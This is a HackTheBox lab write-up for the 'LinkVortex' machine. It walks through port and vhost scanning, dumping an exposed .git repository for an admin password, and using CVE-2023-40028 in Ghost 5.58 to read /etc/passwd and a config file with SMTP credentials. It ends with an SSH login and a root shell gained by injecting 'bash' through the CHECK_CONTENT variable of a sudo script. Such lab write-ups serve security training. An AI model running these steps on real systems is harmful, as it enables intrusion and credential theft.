---
title: HackTheBox -LinkVortex
author: Bonface
date: 2025-05-06 00:00:00 +0000
categories:
  - HackTheBox
  - Machines
tags:
  - HackTheBox
  - linux
  - nmap
  - git
  - cms
  - symlinks
image:
  path: /assets/img/HTB/Machines/linkvortex/linkvortex.png
  alt: linkvortex.htb
---

<div align="center"> <script src="https://app.hackthebox.com/profile/1670709"></script> </div>

---

`LinkVortex` is an easy Linux machine. The initial access is gained by finding an exposed .git directory, which contains credentials. These credentials give access to a Ghost CMS that is vulnerable to `CVE-2023-40028`, allowing users to upload symlinks and read files inside the container. From there, more credentials are found in the Ghost config file, which help get a shell as a user on the host. For privilege escalation, a script with sudo rights is exploited using a symlink race condition, which leads to root access.  

# Enumeration
## port scan

We start off with a  `nmap` scan to identify the open ports.
```bash
nmap --min-rate 1000 10.129.253.130

...[snip]...

Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.06 seconds

```

The scan on the top 1000 ports identifies two open ports but to avoid missing any port lets do quick scan on all the ports`-p-`.

```bash
nmap --min-rate 10000 -p- 10.129.253.130 -o nmap/LinkVortex-nmap-all

...[snip]...

Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 17.49 seconds

```

The two scans were for the open `tcp` ports now lets do a `udp` scan.
```bash
nmap -sU  --min-rate 1000 10.129.253.130

...[snip]...

Not shown: 982 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
664/udp   closed secure-aux-bus
1025/udp  closed blackjack
1032/udp  closed iad3
16700/udp closed unknown
17989/udp closed unknown
19625/udp closed unknown
21710/udp closed unknown
26407/udp closed unknown
28641/udp closed unknown
32771/udp closed sometimes-rpc6
32774/udp closed sometimes-rpc12
39683/udp closed unknown
49190/udp closed unknown
49212/udp closed unknown
51586/udp closed unknown
58631/udp closed unknown
58797/udp closed unknown
62958/udp closed unknown

```

Now that we are certain we have two open ports lets use the nmap scripts to get the services running and the version number.
```bash
nmap -sC -sV -vv -p22,80 10.129.253.130 -o nmap/LinkVortex-nmap

...[snip]...

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMHm4UQPajtDjitK8Adg02NRYua67JghmS5m3E+yMq2gwZZJQ/3sIDezw2DVl9trh0gUedrzkqAAG1IMi17G/HA=
|   256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKKLjX3ghPjmmBL2iV1RCQV9QELEU+NF06nbXTqqj4dz
80/tcp open  http    syn-ack ttl 63 Apache httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Did not follow redirect to http://linkvortex.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

The `OS` is `Ubuntu`.and we have two open ports running `ssh` on port 22 and `http` on port 80.   
The web application redirects to `linkvortex.htb` thus we shall have to add it to our `/etc/hosts`.  
After editing the host file i like running `nmap` on that specific port.  
```bash
nmap -p80 -sC -sV linkvortex.htb -vv

...[snip]...

PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd
|_http-generator: Ghost 5.58
| http-robots.txt: 4 disallowed entries 
|_/ghost/ /p/ /email/ /r/
|_http-server-header: Apache
|_http-title: BitByBit Hardware
| http-methods: 
|_  Supported Methods: POST GET HEAD OPTIONS
|_http-favicon: Unknown favicon MD5: A9C6DBDCDC3AE568F4E0DAD92149A0E3

```

## Web(80)
Let's visit the site:  
![image](https://gist.github.com/user-attachments/assets/6a838088-8290-415a-8979-1fa1c90808ec)

Here we get a page with some posts published by the admin.  
From the second nmap scan we got that we have a `robots.txt` file, lets view its contents:
```bash
curl http://linkvortex.htb/robots.txt
User-agent: *
Sitemap: http://linkvortex.htb/sitemap.xml
Disallow: /ghost/
Disallow: /p/
Disallow: /email/
Disallow: /r/

```

From the 4 disallowed, `/p` ,`/email/` and `/r/` give a `404` error but `/ghost/` gives us a login page:
![image](https://gist.github.com/user-attachments/assets/69508bec-62a3-4082-8b7e-aeba042570d0)

From the site map we can get to `http://linkvortex.htb/sitemap-authors.xml` 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="//linkvortex.htb/sitemap.xsl"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" xmlns:image="http://www.google.com/schemas/sitemap-image/1.1">
	<url>
		<loc>http://linkvortex.htb/author/admin/</loc>
		<lastmod>2024-11-01T08:45:17.000Z</lastmod>
	</url>
</urlset>

```

Thus from the username format the admin user should be `admin@linkvortex.htb` which we can confirm from the login where if we enter an invalid username and click `forgot password` we get a different error than that of the admin thus we have a way to verify the user does exist.  

With that  there isn't much we can do thus am going to run a scan on the `vhost`.
```bash
ffuf -u http://linkvortex.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.linkvortex.htb' -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev'
________________________________________________

 :: Method           : GET
 :: URL              : http://linkvortex.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.linkvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 442ms]
:: Progress: [4989/4989] :: Job [1/1] :: 154 req/sec :: Duration: [0:00:35] :: Errors: 0 ::

```

Now we add `dev` to our `/etc/hosts` as `dev.linkvortex.htb` then visit the site.
![image](https://gist.github.com/user-attachments/assets/e4a440ea-20e7-4651-ba36-63ddf7742ba7)

Since its a static site we can do a directory scan.
```bash
ffuf -u http://dev.linkvortex.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt  -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev'
________________________________________________

 :: Method           : GET
 :: URL              : http://dev.linkvortex.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

.                       [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 260ms]
.git                    [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 243ms]
:: Progress: [43007/43007] :: Job [1/1] :: 142 req/sec :: Duration: [0:04:39] :: Errors: 0 ::

```

To get the repository we use git dumper.
```bash
└─$ git-dumper http://dev.linkvortex.htb/.git/ website
```

Used Vs code to view the changes made on the file and found that there is one that was done but not yet committed.
![image](https://gist.github.com/user-attachments/assets/37801907-0c4c-40b6-9d68-d9d5179590b2)

The password was changed from :  
- `previous` : `thisissupersafe`  
- `Current` : `OctopiFociPilfer45`

Now we have a valid username and some potential passwords.
![image](https://gist.github.com/user-attachments/assets/07697919-d70e-4289-b291-4d46fff83652)
The new password works and we get logged in as the admin.  

Poking around we don't get much but we do get the version of Ghost running.
![image](https://gist.github.com/user-attachments/assets/073d49ea-ccce-4cb8-91de-7478b492f60c)

# Exploitation
Using the version number we get that the application is vulnerable to `Arbitrary File Read`  which is [CVE-2023-40028](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028/blob/master/README.md) .    
The exploit works by leveraging a `symlink` in an uploaded ZIP file, giving the  attacker  unauthorized access to sensitive files on the system.   
Running the exploit:
```
└─$ ./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb
WELCOME TO THE CVE-2023-40028 SHELL
Enter the file path to read (or type 'exit' to quit): /etc/passwd
File content:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash

```

From the `github` repository for Ghost we saw that it has a configuration file, lets try reading it.
```python
Enter the file path to read (or type 'exit' to quit): ../../../config.production.json
File content:
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}

```

Now we have :  
- `user` : `bob`
- `password` : `fibber-talented-worth`  
We try ssh in as bob .
```bash
ssh bob@linkvortex.htb
```

# Privilege Escalation
Since we have the password let's start with `sudo -l`
```bash
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png

```

Here is the script 
```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi


```

Reviewing the script we get that it has command injection at:
```bash
if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi
```
Since the script is running  the false binary we can replace false with `bash`.  
Before that we have to create a `symlink` that does's contain `/etc/` or `/root` since the script will ignore if the `.png` is linked to a file with those paths.
```bash
bob@linkvortex:~$ touch file1
bob@linkvortex:~$ touch file2.png
bob@linkvortex:~$ ln -s file1 file2.png 
ln: failed to create symbolic link 'file2.png': File exists
bob@linkvortex:~$ ln -sf file1 file2.png 
bob@linkvortex:~$ ls -l
total 4
-rw-rw-r-- 1 bob  bob  0 Apr 15 13:26 file1
lrwxrwxrwx 1 bob  bob  5 Apr 15 13:28 file2.png -> file1
-rw-r----- 1 root bob 33 Apr 15 11:56 user.txt
bob@linkvortex:~$ 
```

Now we run the exploit .
```bash
bob@linkvortex:~$ CHECK_CONTENT=bash sudo /usr/bin/bash /opt/ghost/clean_symlink.sh file2.png
Link found [ file2.png ] , moving it to quarantine
root@linkvortex:/home/bob# whoami
root
root@linkvortex:/home/bob# id
uid=0(root) gid=0(root) groups=0(root)
root@linkvortex:/home/bob# 

```

